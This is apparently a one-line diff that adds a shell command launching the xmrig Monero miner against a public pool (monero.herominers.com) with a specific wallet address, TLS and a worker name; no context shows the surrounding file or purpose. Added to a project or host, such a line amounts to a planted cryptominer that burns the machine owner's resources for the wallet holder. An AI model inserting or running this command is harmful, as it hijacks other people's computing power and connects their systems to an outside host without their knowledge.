@@ -1,0 +1,1 @@
+./xmrig -a rx/0 -o monero.herominers.com:10191 -u 84w4ZrqSq4hatUV9pmwX7Eh3QyKF4UCtF4woP5AYGpUZRfKanGPbiqZ8Nkh6G1GWPNPyNYqxk6MfrNBECujPnySzL8jBikB -k --tls -p dim1
